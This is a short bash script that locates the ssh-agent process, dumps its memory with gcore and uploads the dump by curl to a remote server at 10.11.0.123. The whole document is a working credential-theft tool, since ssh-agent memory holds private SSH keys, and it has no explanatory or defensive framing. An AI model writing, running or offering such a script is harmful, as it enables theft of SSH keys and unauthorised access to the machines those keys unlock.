#!/bin/bash
# Dump memory of a process (e.g., ssh-agent) and send

PID=$(pgrep ssh-agent | head -n1)
DUMP_FILE="/tmp/procdump_$PID"

gcore -o "$DUMP_FILE" "$PID" 2>/dev/null
curl -X POST -F "file=@${DUMP_FILE}.${PID}" http://10.11.0.123:8000/upload
